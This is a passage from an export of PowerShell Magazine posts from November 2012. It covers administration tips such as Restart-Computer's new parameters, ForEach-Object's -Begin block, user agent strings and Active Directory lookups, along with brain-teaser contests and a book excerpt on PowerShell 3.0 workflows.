cases.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/11/29/using-custom-argument-completers-in-powershell-3-0/","tags":["Modules","tabexpansion2"],"title":"Using custom argument completers in PowerShell 3.0"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nWhen you work interactively with PowerShell, you don’t want to type too much. You want to use aliases, positional parameters, redirection operators, automatic variables… You just want to type as little as possible. 🙂\nLet’s start with the fully typed command. The command selects three properties of the process objects, converts output to a HTML page, and sends the resulting HTML page to the c:\\temp\\process.html file. You also specify a nice title for the HTML page.\nPS\u0026gt; Get-Process | ConvertTo-Html -Property Name,Path,Company -Title \"Process Information\" | Out-File -FilePath c:\\temp\\process.html  How can you make this command shorter? You can use gps (or even ps) alias instead of the Get-Process cmdlet, omit ConvertTo-Html’s -Property parameter (it’s a positional parameter), and use the redirection operator (\u0026gt;) instead of the Out-File cmdlet.\nPS\u0026gt; gps | ConvertTo-Html Name,Path,Company -Title \"Process Information\" \u0026gt; c:\\temp\\process.html  You have your HTML file now, but you also want to open it in the default browser and check the result. The following command might look cryptic, but I’m sure you will use it all the time after you finish reading this tip.\nPS\u0026gt; ii $$  That command’s opened the c:\\temp\\process.html file in the default browser, right? The magic of PowerShell. Why does that command work? ii is the alias for the Invoke-Item cmdlet, but the real power lies in the $$ automatic variable. $$ automatic variable contains the last token in the last line received by the session, and in this case that’s c:\\temp\\process.html.\nBy the way, start, the alias of the Start-Process cmdlet, comes in handy for this task as well.\nPS\u0026gt; start c:\\temp\\process.html  That’s short and easy to understand. However, as you have seen, you can do it better.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/11/28/pstip-how-to-quickly-open-output-file/","tags":["Tips and Tricks"],"title":"#PSTip How to quickly open output file"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nYou’ve updated your PowerShell help using the Update-Help cmdlet and you are pretty sure that you’ve got help files for PSWorkflow and PSScheduledJob modules as well. If you look into their folders, you can see the help files:\nPS\u0026gt; echo PSworkflow,PSScheduledJob | foreach { dir $pshome\\Modules\\$_\\en-US } Directory: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PSworkflow\\en-US Mode LastWriteTime Length Name ---- ------------- ------ ---- -a--- 10/31/2012 11:23 AM 28323 about_ActivityCommonParameters.help.txt -a--- 10/31/2012 11:23 AM 3221 about_Checkpoint-Workflow.help.txt -a--- 10/31/2012 11:23 AM 3199 about_Foreach-Parallel.help.txt -a--- 10/31/2012 11:23 AM 4655 about_InlineScript.help.txt -a--- 10/31/2012 11:23 AM 1706 about_Parallel.help.txt -a--- 10/31/2012 11:23 AM 3315 about_Sequence.help.txt -a--- 10/31/2012 11:23 AM 4464 about_Suspend-Workflow.help.txt -a--- 10/31/2012 11:23 AM 16166 about_WorkflowCommonParameters.help.txt -a--- 10/31/2012 11:23 AM 12046 about_Workflows.help.txt -a--- 11/6/2012 10:18 AM 61184 Microsoft.PowerShell.Workflow.ServiceCore.dll-help.xml Directory: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PSScheduledJob\\en-US Mode LastWriteTime Length Name ---- ------------- ------ ---- -a--- 9/27/2012 10:44 AM 11695 about_Scheduled_Jobs.help.txt -a--- 9/27/2012 10:44 AM 9913 about_Scheduled_Jobs_Advanced.help.txt -a--- 9/27/2012 10:44 AM 11214 about_Scheduled_Jobs_Basics.help.txt -a--- 9/27/2012 10:44 AM 21071 about_Scheduled_Jobs_Troubleshooting.help.txt -a--- 10/1/2012 12:33 AM 390801 Microsoft.PowerShell.ScheduledJob.dll-help.xml But when you try to output about_WorkflowCommonParameters help topic, for example, you get an error:\nPS C:\\\u0026gt; Get-Help about_WorkflowCommonParameters Get-Help : Get-Help could not find about_WorkflowCommonParameters in a help file in this session. To download updated help topics type: \"Update-Help\". To get help online, search for the help topic in the TechNet library at http://go.microsoft.com/fwlink/?LinkID=107116.  Why? You are bitten by a bug in the module auto-loading feature implementation. The work around is to import PSWorkflow (or PSScheduledJob) module first:\nPS\u0026gt; Import-Module PSWorkflow PS\u0026gt; Get-Help about_* Name Category Module Synopsis ---- -------- ------ -------- ... ... ... ... ... ... ... ... about_ActivityCommonParameters HelpFile Describes the parameters that Windows PowerShell about_Checkpoint-Workflow HelpFile Describes the Checkpoint-Workflow activity, which about_Foreach-Parallel HelpFile Describes the ForEach -Parallel language construct in about_InlineScript HelpFile Describes the InlineScript activity, which runs Windows about_Parallel HelpFile Describes the Parallel keyword, which runs the about_Sequence HelpFile Describes the Sequence keyword, which runs selected about_Suspend-Workflow HelpFile Describes the Suspend-Workflow activity, which suspends about_WorkflowCommonParameters HelpFile This topic describes the parameters that are valid on all Windows about_Workflows HelpFile Provides a brief introduction to the Windows Voilà! You can now enjoy all the knowledge packed in these About help topics.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/11/27/pstip-where-are-my-about-help-topics-for-powershell-workflows-and-scheduled-jobs/","tags":["Tips and Tricks"],"title":"#PSTip Where are my About help topics for PowerShell workflows and scheduled jobs?"},{"categories":["Brainteaser"],"contents":"Hello everyone! The Brain Teaser series continues.\nFirst, we would like to announce the winner of the previous brain teaser. We got a number of very interesting and creative solutions. The shortest answer — [Net.DNS]::GetHostAddresses(“”), with 31 characters — was given by sahal. So, he is the winner!\nCongratulations sahal, you get an eBook version of Microsoft Windows PowerShell 3.0 First Look written by Adam Driscoll and published by Packt.\nWe would like to thank Joel ‘Jaykul’ Bennett for the new brain teaser.\nYou have an array of words: ‘Hannah’,’Jeffrey’,’12321′,’Madam’,’Abracadabra’. Your new task is to output only palindromic words.\nThe input is: ‘Hannah’,’Jeffrey’,’12321′,’Madam’,’Abracadabra’\nThe output is:\nHannah\n12321\nMadam\nOnce again, the shortest answer wins! Be aware, a space is a character too.\nPlease use the comment box at the bottom of this page to submit your solutions by Friday. The winner will be announced on the next Monday.\nDon’t have a solution of your own or has it already been posted by others? You can still participate and add your voice by voting on the existing comment by using the up/down voting arrows.\nThis time, the prize is again the eBook version of Microsoft Windows PowerShell 3.0 First Look written by Adam Driscoll. We would like to thank our sponsor Packt, one of the most prolific and fast-growing tech book publishers in the world, for providing such a cool prize.\nGood luck!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/11/27/output-only-the-palindromic-words/","tags":["Brainteaser"],"title":"Output only the palindromic words"},{"categories":["How To","Tips and Tricks"],"contents":"As the name suggests the Restart-Computer cmdlet helps in restarting the operating system on the local and remote computers.\nCompared to earlier version of Restart-Computer in PowerShell 2.0, the new Restart-Computer cmdlet offers much better flexibility and control to an admin. PowerShell Scripts which require an intermittent restart of remote computers in between of a script execution are handled with better control in the new version of this cmdlet. I went through all Restart-Computer’s parameters in PowerShell 2.0 and 3.0 and here’s what I saw:\n– in PowerShell 3.0, Restart-Computer has 15 parameters excluding the common parameters\n– PowerShell 2.0 has a total of 9 parameters for Restart-Computer cmdlet\nI’ve prepared a small Excel sheet to compare the various new and old parameters present in Restart-Computer.\nPowerShell 3.0 has 6 more new parameters for Restart-Computer and the Authentication parameter is renamed to DcomAuthentication.\nRestart-Computer cmdlet allows us to run the restart operation as a background job. We can also specify the authentication levels and provide alternate credentials to initiate the restarts.\nOne of the brilliant features of this cmdlet in Windows PowerShell 3.0 is that we can wait for the restart to complete before running the next command, specify a waiting timeout and query interval, and wait for particular services to be available on the restarted computer. This feature makes it practical to use Restart-Computer in scripts which require a computer restart in between of its execution.\nWe can also use WSMan protocol to restart the computer, in case DCOM calls are blocked by a Firewall rule or an enterprise policy. This feature was not available in PowerShell 2.0. Now, let’s talk about some of the cool features available with the new parameter sets introduced in PowerShell 3.0.\n-Wait We can use this parameter in a script to restart computers and then continue processing when the restart is complete.\nBy default, the Wait parameter waits indefinitely for the computers to restart, but you can use the Timeout parameter to specify the duration of wait and the For and Delay parameters to wait for particular services to be available on the restarted computers. The following PowerShell one-liner represents an example for this parameter:\nRestart-Computer -ComputerName Server01 -Wait  This command restarts the Server01 remote computer and waits indefinitely for the remote server to restart. By default it checks for WMI, WinRM, and PowerShell connectivity to move to the next line in script.\nHere’s an example when I restarted one of my server, by default it checked till WMI, WinRM, and PowerShell connectivity was established to return me with the PowerShell prompt.\n-For When we specify the For parameter with Restart-Computer it waits until the specified service or feature is available after the computer is restarted for a set of predefined values. This parameter is valid only with the Wait parameter. Valid values are:\n Default: Waits for Windows PowerShell to restart. PowerShell: Can run commands in a Windows PowerShell remote session on the computer. WMI: Receives a reply to a Win32_ComputerSystem query for the computer. WinRM: Can establish a remote session to the computer by using WS-Management.  Now the new ISE in PowerShell 3.0 has IntelliSense which auto-populates these values:\nThe next PowerShell one-liner represents an example for this parameter:\nRestart-Computer -ComputerName Server01 -Wait -For WinRM  This command restarts the Server01 remote computer and waits until WinRM service is up and running on the remote server.\n-Timeout Specifies the duration of the wait, in seconds. When the timeout elapses, Restart-Computer returns the command prompt, even if the computer is not restarted. The default value, -1, represents an indefinite timeout. The Timeout parameter is valid only with the Wait parameter.\nI specified a timeout of 10 seconds for a computer restart, as my computer did not restart in 10 seconds and took much longer time I was immediately returned to the PowerShell prompt:\nRestart-Computer -ComputerName Server01 -Wait -For WinRM -Timeout 10  -Delay This parameter determines how often Windows PowerShell queries the service that is specified by the For parameter to determine whether it is available after the computer is restarted. The default value is 5 (seconds).This parameter is valid only with the Wait and For parameters.\nWith the below PowerShell one-liner I have illustrated the same with two screenshots representing the progress of restarting process. I have specified a delay of 6 seconds; so after a delay of every 6 seconds PowerShell queries for WinRM connectivity to server until it’s able to verify that connectivity has been successfully established.\nRestart-Computer -ComputerName Server01 -Wait -For WinRM -Delay 6  If we specify a lower Delay parameter it reduces the interval between queries to the remote computer that determine whether it is restarted.\n-Protocol Specifies which protocol to use to restart the computers. Valid values are WSMan and DCOM. The default value is DCOM. These settings are designed for enterprises in which DCOM-based restarts fail because DCOM is blocked, such as by a firewall rule.\nRestart-Computer -ComputerName Server01 -Protocol WSMan  This command restarts the Server01 remote computer and uses the WSMan protocol.\n-WsmanAuthentication Specifies the mechanism that is used to authenticate the user’s credentials when using the WSMan protocol. Valid values are Basic, CredSSP, Default, Digest, Kerberos, and Negotiate. The default value is Default.\nRestart-Computer -ComputerName Server01 -WSManAuthentication Kerberos  This command restarts the Server01 remote computer and uses Kerberos authentication. If the User does not have the permissions to restart the remote server it would throw an access denied error.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/11/27/better-restart-computer-cmdlet-in-powershell-3-0/","tags":["How To","Tips and Tricks"],"title":"Better Restart-Computer cmdlet in PowerShell 3.0"},{"categories":["Tips and Tricks"],"contents":"Sometimes you need to create a copy of an exiting directory structure without copying the files, and you also want to include empty folders if they exist. An example would be a deep project directory structure that needs to be created for a new project.\nIn the days of DOS you could use the XCOPY command. The following command creates the Windows directory structure under the temp directory of drive D:.\nXCOPY c:\\Windows d:\\temp\\Windows /E /T /I  In PowerShell you can use the Copy-Item cmdlet. The Filter scriptblock specifies the PSIsContainer property which passes on just folder objects:\nCopy-Item $env:windir d:\\temp\\windows -Filter {PSIsContainer} -Recurse -Force   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/11/26/pstip-duplicating-folder-structures/","tags":["Tips and Tricks"],"title":"#PSTip Duplicating folder structures"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nIn an earlier tip, you saw how an empty file of a specified size can be created. In today’s tip, we shall see how an empty folder structure can be created.\nIn the good old DOS days, we would create an empty folder structure by using md or mkdir commands. This is the PowerShell era. So, how do we do that in PowerShell? Simple:\nPS\u0026gt; New-Item -ItemType Directory -Path \".\\FolderX\\FolderY\\FolderZ\"  That is it!\nThe ‘.’ at the beginning of -Path parameter value tells New-Item cmdlet to create the folder structure in the present working directory. Without this, the folder structure gets created at the root of the current drive.\nBut wait, did you know that we have md and mkdir commands in PowerShell too? mkdir is a function defined in PowerShell that uses New-Item cmdlet to create folder(s) and md is an alias to mkdir.\nPS C:\\\u0026gt; Get-Command mkdir CommandType Name ModuleName ----------- ---- ---------- Function mkdir PS C:\\\u0026gt; Get-Alias md CommandType Name ModuleName ----------- ---- ---------- Alias md -\u0026gt; mkdir So, now, we can use these commands the same way we used New-Item cmdlet.\nPS\u0026gt; md \".\\FolderX\\FolderY\\FolderZ\"  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/11/23/pstip-create-an-empty-folder-structure/","tags":["Tips and Tricks"],"title":"#PSTip Create an empty folder structure"},{"categories":["Tips and Tricks"],"contents":"Sometimes you need to create a file of the specified size, as a placeholder for instance. There are many utilities that do that (e.g. fsutil ) but in this tip I’ll show you how to create a file of the specified size using a .NET class.\nfunction New-EmptyFile { param( [string]$FilePath,[double]$Size ) $file = [System.IO.File]::Create($FilePath) $file.SetLength($Size) $file.Close() Get-Item $file.Name } For example, you can use the New-EmptyFile function to create a 20 MB file:\nPS\u0026gt; New-EmptyFile -FilePath c:\\temp\\test.txt -Size 20mb Directory: C:\\temp Mode LastWriteTime Length Name ---- ------------- ------ ---- -a--- 11/22/2012 3:39 PM 20971520 test.txt ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/11/22/pstip-create-a-file-of-the-specified-size/","tags":["Tips and Tricks"],"title":"#PSTip Create a file of the specified size"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nLet’s say you want to rename a bunch of files in a folder and imagine that you used the following code:\nGet-ChildItem -Recurse C:\\Scripts | ForEach-Object { $count = 0; Rename-Item -Path $_.FullName -NewName \"TestScript${Count}$($_.Extension)\"; $count++}  What do you think will happen here? You may see numerous error messages that the new file name already exists! Let’s quickly check the syntax of ForEach-Object cmdlet:\nPS C:\\\u0026gt; Get-Command ForEach-Object -Syntax ForEach-Object [-Process] \u0026lt;scriptblock[]\u0026gt; [-InputObject \u0026lt;psobject\u0026gt;] [-Begin \u0026lt;scriptblock\u0026gt;] [-End \u0026lt;scriptblock\u0026gt;] [-RemainingScripts \u0026lt;scriptblock[]\u0026gt;] [-WhatIf] [-Confirm] [\u0026lt;CommonParameters\u0026gt;] ForEach-Object [-MemberName] \u0026lt;string\u0026gt; [-InputObject \u0026lt;psobject\u0026gt;] [-ArgumentList \u0026lt;Object[]\u0026gt;] [-WhatIf] [-Confirm] [\u0026lt;CommonParameters\u0026gt;] As you see in the above output, the default parameter set of ForEach-Object cmdlet has -Begin, -Process, and -End parameters. When no parameter name is specified, the script block gets assigned to the -Process parameter and gets executed every time an object is available in the pipeline. So, this behavior causes $count to get re-initialized to zero in every iteration.\nSo, how do we work around this? This is where the Begin script block comes handy. The script block passed to the -Begin parameter executes only once and it is a good place to initialize $count variable. Let us see how:\nGet-ChildItem -Recurse C:\\Scripts | ForEach-Object -Begin { $count = 0} -Process { Rename-Item -Path $_.FullName -NewName \"TestScript${Count}$($_.Extension)\"; $count++}  Also, note that it is not mandatory to specify the -Begin and -Process parameters. We can simply write:\nGet-ChildItem -Recurse C:\\Scripts | ForEach-Object { $count = 0} { Rename-Item -Path $_.FullName -NewName \"TestScript${Count}$($_.Extension)\"; $count++}   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/11/21/pstip-foreach-object-gotcha/","tags":["Tips and Tricks"],"title":"#PSTip ForEach-Object Gotcha!"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nThe Invoke-WebRequest and Invoke-RestMethod cmdlets have the -UserAgent parameter, so you can specify a user agent string for the web request. A user agent string has “Compatibility (Platform; OS; Culture) App” format, and by default, PowerShell 3.0 identifies itself as “Mozilla/5.0 (Windows NT; Windows NT 6.1; en-US) WindowsPowerShell/3.0” on my Windows 7 machine. What values should we specify if we want to customize the user agent string? Static properties of the [Microsoft.PowerShell.Commands.PSUserAgent] class provide some pre-configured values:\nPS\u0026gt; [Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name, @{n='UserAgent';e={ [Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name) }} Name UserAgent ---- --------- InternetExplorer Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 6.1; en-US) FireFox Mozilla/5.0 (Windows NT; Windows NT 6.1; en-US) Gecko/20100401 Firefox/4.0 Chrome Mozilla/5.0 (Windows NT; Windows NT 6.1; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 Safari/534.6 Opera Opera/9.70 (Windows NT; Windows NT 6.1; en-US) Presto/2.2.1 Safari Mozilla/5.0 (Windows NT; Windows NT 6.1; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16 We can use it like in the following command:\nPS $userAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome PS Invoke-WebRequest https://powershellmagazine.com -UserAgent $userAgent   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/11/20/pstip-powershell-and-the-pre-configured-user-agent-strings/","tags":["Tips and Tricks"],"title":"#PSTip PowerShell and the pre-configured user agent strings"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nPowerShell has many logging capabilities but sometimes what you want is to capture what’s already written to the console. Capturing this information can be a challenge as you need to script the console buffer content. You can see how in this post by the PowerShell team blog. In the ISE however this task becomes a lot easier; it is just a matter of reading the content of the output (console) pane.\nIn ISE v2:\nPS\u0026gt; $psise.CurrentPowerShellTab.Output.Text  In ISE v3:\nPS\u0026gt; $psise.CurrentPowerShellTab.ConsolePane.Text  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/11/19/pstip-capture-console-screen/","tags":["Tips and Tricks"],"title":"#PSTip Capture console screen"},{"categories":["Brainteaser"],"contents":"Hello everyone! The Brain Teaser series continues.\nFirst, we would like to announce the winner of the previous brain teaser. We got a few answers in which many of them have a command length of 8. The shortest answer — ($x=ps), with 7 characters — was given by Mike F Robbins. So, he is the winner! In his solution, the assignment is placed inside the parenthesis so that the results of “ps” (alias to Get-Process) are stored in the variable $x as well as displayed on the console.\nCongratulations Mike, you get an eBook version of Learn Windows PowerShell 3 in a Month of Lunches, Second Edition written by Don Jones and Jeffery Hicks.\nHere is the new brain teaser!\nYour new task is to get a list of IP addresses (IPv4 and IPv6, if present) of the local machine. Sounds easy? Well, here are some of the constraints to make it interesting:\n You cannot use WMI You cannot use IPCONFIG You cannot reference $env:ComputerName or localhost as the computer name Your command should return an IP address object! You cannot use Windows 8 networking cmdlets or similar for other OS   Once again, the shortest answer wins! Be aware, a space is a character too.  Please use the comment box at the bottom of this page to submit your solutions by Friday. The winner will be announced on the next Monday.\nDon’t have a solution of your own or has it already been posted by others? You can still participate and add your voice by voting on the existing comment by using the up/down voting arrows.\nThis time, the prize is again the eBook version of Microsoft Windows PowerShell 3.0 First Look written by Adam Driscoll. We would like to thank our sponsor Packt, one of the most prolific and fast-growing tech book publishers in the world, for providing such a cool prize.\nGood luck!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/11/19/find-a-list-of-all-ip-addresses-assigned-to-the-local-system/","tags":["Brainteaser"],"title":"Find a list of all IP addresses assigned to the local system"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\n$host automatic variable contains the details of the PowerShell host. For example, information such as the name of the host, UI culture information, etc. We can use this automatic variable to find the name of the PowerShell host.\n$host.Name  The output of the above snippet will be “ConsoleHost” for PowerShell.exe and “Windows PowerShell ISE Host” for PowerShell ISE.\nWhen in a remote session (for example, using Enter-PSSession) or referring to $host.name inside the Invoke-Command’s script block, you will receive the host name as ServerRemoteHost.\nPS\u0026gt;Invoke-Command -ComputerName Server01 -ScriptBlock {$host.name} ServerRemoteHost  This is especially useful when your script needs to act in a different way in a remote session as compared to a local session.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/11/16/pstip-identifying-the-name-of-the-powershell-host/","tags":["Tips and Tricks"],"title":"#PSTip Identifying the name of the PowerShell host"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nEvery PowerShell host implements the $pid automatic variable which refers to the process ID of the PowerShell host process. Using it, we can find the name of the PowerShell host process within a script or a command.\n(Get-Process -Id $pid).Name  The above snippet outputs process name such as powershell and powershell_ise for PowerShell.exe and PowerShell_ISE.exe respectively. Or any other process name depending on the script editor (such as PowerShell Plus, etc) or the PowerShell host you have installed.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/11/15/pstip-find-powershell-host-process-name/","tags":["Tips and Tricks"],"title":"#PSTip Find PowerShell host process name"},{"categories":["Tips and Tricks"],"contents":"We’ll use the [adsisearcher] type accelerator. The [adsisearcher] type is just a shortcut to the System.DirectoryServices.DirectorySearcher .NET class.\nPS\u0026gt; [adsisearcher].FullName System.DirectoryServices.DirectorySearcher  We can use the accelerator to create a DirectorySearcher instance by supplying a LDAP filter. We can refine the search by changing other properties of the search object.\nPS\u0026gt; $searcher = [adsisearcher]\u0026quot;(objectClass=user)\u0026quot; PS\u0026gt; $searcher CacheResults : True ClientTimeout : -00:00:01 PropertyNamesOnly : False Filter : (objectClass=user) PageSize : 0 PropertiesToLoad : {} ReferralChasing : External SearchScope : Subtree ServerPageTimeLimit : -00:00:01 ServerTimeLimit : -00:00:01 SizeLimit : 0 SearchRoot : Sort : System.DirectoryServices.SortOption Asynchronous : False Tombstone : False AttributeScopeQuery : DerefAlias : Never SecurityMasks : None ExtendedDN : None DirectorySynchronization : VirtualListView : Site : Container : For our purpose–finding the currently logged-on user’s email address–we want to pass the user name as the value for the SamAccountName property and ask for one result only. We will use the $env:USERNAME environment variable, and then query the mail property.\nPS\u0026gt; $searcher = [adsisearcher]\"(samaccountname=$env:USERNAME)\" PS\u0026gt; $searcher.FindOne().Properties.mail   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/11/14/pstip-how-to-get-the-email-address-of-the-currently-logged-on-user/","tags":["Tips and Tricks"],"title":"#PSTip How to get the email address of the currently logged-on user"},{"categories":["News"],"contents":"Today we have a real treat for you–an excerpt about the Windows PowerShell Workflow feature from the upcoming book Learn PowerShell Toolmaking in a Month of Luncheswritten by Don Jones and Jeffery Hicks.Workflows are a type of PowerShell command, just as cmdlets and functions are types of commands. One of the easiest ways to understand workflows is to contrast them with their closest cousin: functions. This article, based on chapter 18 of Learn PowerShell Toolmaking in a Month of Lunches, discusses the facets and design guidelines of workflows in PowerShell 3.0.\nYou may also be interested in…\nPowerShell 3 Workflows Functions are declared with the function keyword; workflows are declared with the workflow keyword. Functions are executed by PowerShell itself; workflows are translated to the .NET Framework’s Windows Workflow Foundation (WF) and executed by WF external to PowerShell. Both functions and workflows execute a given set of commands in a specific sequence, but workflows—thanks to WF—include detailed logging and tracking of each and include the ability to retry steps that fail because of, for example, an intermittent network hiccup or other transitory issue. Functions do one thing at a time; workflows can do one thing at multiple times—parallel multitasking. Functions start, run, and finish; a workflow can pause, stop, and restart. If you turn off your computer in the middle of a function, the function is lost; if you do so while a workflow is running, the workflow can potentially be recovered and resumed automatically.\nTable 1 illustrates some of the differences between a function and a workflow.\nTable 1 Function or workflow\n   Function Workflow     Executed by PowerShell Executed by workflow engine   Logging and retry attempts through complicated coding Logging and retry attempts part of the workflow engine   Single-action processing Supports parallelism   Runs to completion Can run, pause, and restart   Data loss possible during network problems Data can persist during network problems   Full language set and syntax Limited language set and syntax   Runs cmdlets Runs activities    Workflow is incorporated into the shell by running Import-Module PSWorkflow; that module extends PowerShell to understand workflows and to execute them properly. Workflows are exposed as commands, meaning you execute them just like commands. For example, if you created a workflow named Do-Something, you’d just run Do-Something to execute it or run Do-Something –AsJob to run it in PowerShell’s background job system. Executing a workflow as a job is cool, because you can then use the standard –Job cmdlets (like Get-Job and Receive-Job) to manage them. There are also Suspend-Job and Resume-Job commands to pause and resume a workflow job.\nCommon parameters for workflows Just by using the workflow keyword, you give your workflow command a pretty large set of built-in common parameters. We’re not going to provide an extensive list, but here are some of the more interesting ones (and you can consult PowerShell’s documentation for the complete list):\n –PSComputerName—A list of computers to execute the workflow on –PSParameterCollection—A list of hash tables that specify different parameter values for each target computer, enabling the workflow to have variable behavior on a per-machine basis –PSCredential—The credential to be used to execute the workflow –PSPersist—Force the workflow to save (checkpoint) the workflow data and state after executing each step (we’ll show you how you can also do this manually)  There are also a variety of parameters that let you specify remote connectivity options, such as –PSPort, –PSUseSSL, –PSSessionOption, and so on; these correspond to the similarly named parameters of Remoting commands like Invoke-Command and New-PSSession.\nThe values passed to these parameters are accessible as values within the workflow. For example, a workflow can access $PSComputerName to get the name of the computer that particular instance of the workflow is executing against right then.\nActivities and stateless execution Workflow is built around the concept of activities. Each PowerShell command that you run within a workflow is a single, standalone activity.\nThe big thing to get used to in workflow is that each command, or activity, executes entirely on its own. Because a workflow can be interrupted and later resumed, each command has to assume that it’s running in a completely fresh, brand-new environment. Variables created by one command can’t be used by the next command, which can get a bit weird. Workflow does support an InlineScript block, which will execute all commands inside the block within a single PowerShell session. Everything within the block is a standalone script.\nNow, this isn’t to say that variables don’t work at all; that would be pretty pointless. For example, consider the script in the following listing (we’ve included this as a numbered listing so that you can run it for yourself in the PowerShell ISE, if you like).\nListing 1 Example workflow with variables\n   12345678910111213141516 Import-Module PSWorkflow workflow Test-Workflow { $a = 1 $a $a++ $a $b = $a + 2 $b } Test-Workflow          Try it Now Run this, and you should see the output 1, 2, and 4, with each number on its own line. That’s the expected output, and seeing that will help you verify that workflow is operating on your system.\nNow try the example in this listing.\nListing 2 Example workflow that won’t work properly\n   123456789101112 Import-Module PSWorkflow workflow Test-Workflow { $obj = New-Object -TypeName PSObject $obj | Add-Member -MemberType NoteProperty  -Name ExampleProperty -Value \u0026lsquo;Hello!\u0026rsquo; $obj | Get-Member} Test-Workflow          This doesn’t produce the intended results, in that the object in $obj won’t have an ExampleProperty property containing “Hello!” That’s because Add-Member runs in its own space, and its modification to $obj doesn’t persist to the third command in the workflow. To make this work, we could wrap the entire set of commands as an InlineScript, forcing them to all execute at the same time, within a single PowerShell instance. The following listing shows this example.\nListing 3 Example workflow using InlineScript\n   1234567891011121314 Import-Module PSWorkflow workflow Test-Workflow { InlineScript { $obj = New-Object -TypeName PSObject $obj | Add-Member -MemberType NoteProperty  -Name ExampleProperty -Value \u0026lsquo;Hello!\u0026rsquo; $obj | Get-Member }} Test-Workflow          Try it Now Try each of these three examples and compare their results. Workflows do take a big of getting used to, and these simple examples will help you to start understanding workflow’s key differences.\nPersisting state The state of a workflow consists of its current output, the task that it’s currently executing, and other information. It’s important that you help the workflow maintain this state, especially when kicking off a long-running command that might be executed. To do so, run the Checkpoint-Workflow command (or the Persist workflow activity). You can force this to happen after every single command is executed by running the workflow with the –PSPersist switch.\nSuspending and resuming workflows A workflow can suspend itself if you run Suspend-Workflow within the workflow. You might do this, for example, if you’re about to run some high-workload command that can only be run during a maintenance window. Before running the command, you check the time, and if you’re not in the window, you suspend the workflow. Someone would need to manually resume the workflow (or schedule it in Task Scheduler) by running Resume-Job and providing the necessary job ID.\nInherently remotable Workflows are designed from the ground up to be remoted, which is why all workflow commands get a –PSComputerName parameter automatically. If you run a workflow with one or more computer names, PowerShell connects to the remote computers via Remoting (which must be enabled) and has those computers run the workflow using their local resources. This means the remote computers must also be running PowerShell 3.0. But the following core PowerShell commands always run locally on the machine where the workflow was initiated:\n Add-Member Compare-Object ConvertFrom-Csv, ConvertFtom-Json, ConvertFrom-StringData Convert-Path ConvertTo-Csv, ConvertTo-Html, ConvertTo-Xml ForEach-Object Get-Host Get-Member Get-Random Get-Unique Group-Object Measure-Command Measure-Object New-PSSessionOption, New-PSTransportOption New-TimeSpan Out-Default, Out-Host, Out-Null, Out-String Select-Object Sort-Object Update-List Where-Object Write-Debug, Write-Error, Write-Host, Write-Output, Write-Progress, Write-Verbose, Write-Warning  These are run locally mainly for performance reasons; if you need one of these to run on a targeted remote computer, wrap them in an InlineScript{} block.\nParallelism Windows workflow is designed to execute tasks in parallel, and PowerShell exposes that capability through a modified ForEach scripting construct and a new Parallel construct. They work a bit differently.\nWith Parallel, the commands inside the construct can run in any order. Within the Parallel block, you can use the Sequence keyword to surround a set of commands that must be executed in order; that batch of commands may begin executing at any point, for example:\n   12345678910111213 Workflow Test-Workflow { \u0026ldquo;This will run first\u0026rdquo; parallel { \u0026ldquo;Command 1\u0026rdquo; \u0026ldquo;Command 2\u0026rdquo; sequence { \u0026ldquo;Command A\u0026rdquo; \u0026ldquo;Command B\u0026rdquo; } }}          The output here might be\n   1234 Command 1Command ACommand BCommand 2          Command B will always come after Command A, but Command A might come first, second, or last—there’s no guarantee. The commands actually execute at the same time, meaning Command 1, Command 2, and the sequence may all kick off at once, which is what makes the output somewhat nondeterministic. This is useful for when you have several tasks to complete, don’t care about the order in which they run, and want them to finish as quickly as possible.\nThe parallelized ForEach is somewhat different:\n   12345 Workflow Test-Workflow { Foreach –parallel ($computer in $computerName) { Do-Something –computerName $computer }}          Here, WF may launch multiple simultaneous Do-Something commands, each targeting a different computer. Execution should be roughly in whatever order the computers are stored in $ComputerName, although because of varying execution times the order of the results is nondeterministic.\nGeneral workflow design strategy It’s important to understand that the entire contents of the workflow get translated into WF’s own language, which only understands activities. With the exception of a few commands, Microsoft has provided WF activities that correspond to most of the core PowerShell cmdlets. That means most of 